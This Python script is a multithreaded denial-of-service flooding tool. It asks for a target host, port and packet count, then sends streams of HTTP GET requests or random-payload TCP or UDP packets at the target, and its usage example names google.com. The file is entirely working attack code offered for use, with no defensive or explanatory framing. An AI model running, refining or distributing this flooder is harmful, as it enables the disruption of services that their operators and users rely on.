# -*- coding: utf-8 -*-

from datetime import datetime
from scapy.all import *
import socket
import random
import sys
import time
from threading import Thread
from termcolor import colored


version = 2.0

def showBanner():
	with open("lib/banner.txt") as f:
		print(colored( f.read(), "red") + "[" + str(version) + "]\n")

def usageMsg():
	print("USAGE: python " + sys.argv[0] + "  [HOST] [PORT] [PACKETS] [TIMEOUT]"
                "\nEXAMPLE: python " + sys.argv[0] + "  http://google.com 80 10000 0.01\n")
	exit(0)

showBanner()
 
ip       = ""
host_arr = []	

if len(sys.argv) == 1:

	while True:

		target     = input("[+]TARGET > ")

		try:
			host_arr = target.split('/')
			host     = host_arr[2]
			ip       = str(socket.gethostbyname(host))
			break

		except:

			if len(target.split('.')) == 4:
				host = target
				ip   = str(host)
				break

			else:
				print(colored("Host is incorrect!","red"))

	while True:

		try:
			port     = int(input("[+]PORT > "))
			threads  = int(input("[+]PACKETS > "))
			timeout  = float(input("[+]TIMEOUT (less than 1) > "))
			print("")
			break

		except:
			print(colored("Incorrect input!", "red"))

elif len(sys.argv) != 5:
	usageMsg()

else:
	try:
		ip       = ""
		host     = ""
		host_arr = []
		port     = int(sys.argv[2])
		threads  = int(sys.argv[3])
		timeout  = float(sys.argv[4])
	except:
		usageMsg()

	try:
		host_arr = sys.argv[1].split('/')
		host     = host_arr[2]
		ip       = str(socket.gethostbyname(host))

	except:

		if len(sys.argv[1].split('.')) == 4:
			host = sys.argv[1]
			ip   = str(host)

		else:
			print(colored("Host is incorrect!\n","red"))
			usageMsg()


url      = ''
i        = 3
req      = 0
err      = 0
d        = "-------------"

while i < len(host_arr):
	url += host_arr[i] + "/"
	i += 1

url = url.replace("//", "/")

for i in range(len(list(host))):
	d += "-"

request  = "GET /" + url + " HTTP/1.1\n"\
		"Host: " + host +"\n"\
                "Connection: close\n"\
                "User-agent: Mozila/5.0 (Windows: U; Windows NT 5.1; fr; rv:1.8.1.3) "\
                        "Gecko/20070309 firefox/2.0.0.3\n"\
                "Referer: http://google.com/\n"\
		"\n"

print("[*]Author: PixHead")
print(d)
print("[+]TARGET: " + host + " ¦")
print(d)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	sock.connect((host, port))
	print(colored("[*]", "green") + "SUCCESSFULLY CONNECTED!")
except:
	print(colored("[X]", "red") + "ERROR: Host is unreachable...")
	exit(0)

sock.close()

def atackHttp():
	global req
	global err

	req += 1
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		sock.connect((host, port))
		sock.send(request.encode())
	except:
		err += 1
	finally:
		sock.close()

	if req % 1000 == 0:
		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err, "red") + "] ") 

def atackTcp():
	global req
	global err

	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/TCP(sport=RandShort(), dport=int(port))/data)

	req += 1
	sock = socket.socket()

	try:
		sock.connect((ip, port))
		sock.send(r)
	except:
		err += 1
	finally:
		sock.close()

	if req % 1000 == 0:
		print(colored("[+]", "green") + " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

def atackUdp():
	global req
	global err

	data = random._urandom(1024)
	r    = bytes(IP(dst=host)/UDP(dport=int(port))/data)

	req += 1
	sock = socket.socket()

	try:
		sock.connect((ip, port))
		sock.send(r)
	except:
			err += 1
	finally:
		sock.close()

	if req % 1000 == 0:
		print(colored("[+]", "green")+ " [" + str(datetime.now().strftime("%d %b %Y %H:%M:%S")) + "] " + host + " [" + colored(err,"red") + "] ")

alltypes = ['udp','tcp','http','1','2','3']
mode     = ""

while True:

	type = str(input("[HTTP/TCP/UDP][1/2/3] > "))

	if type.lower() in alltypes:
		if type == '1' or type.lower() == 'http':
			mode = 'HTTP'
		elif type == '2' or type.lower() == 'tcp':
			mode = 'TCP'
		elif type == '3' or type.lower() == 'udp':
			mode = 'UDP'

		print('[+]Mode set to ' + mode)
		break

	else:
		print(colored('Wrong type!',"red"))
		

print("[*]STARTING...\n")

all_threads = []

for i in range(threads):

	if mode == 'HTTP':
		th = Thread(target=atackHttp)
	elif mode == 'TCP':
		th = Thread(target=atackTcp)
	elif mode == 'UDP':
		th = Thread(target=atackUdp)

	try:
		th.daemon = True
		th.start()
		all_threads.append(th)
	except:
		print(colored("Initialization failed...", "red"))

	time.sleep(timeout)

for thr in all_threads:
	thr.join()

print("\nDone!")
print("Total: " + str(req) + ", failed: " + str(err) + "\n")
sys.exit(0)
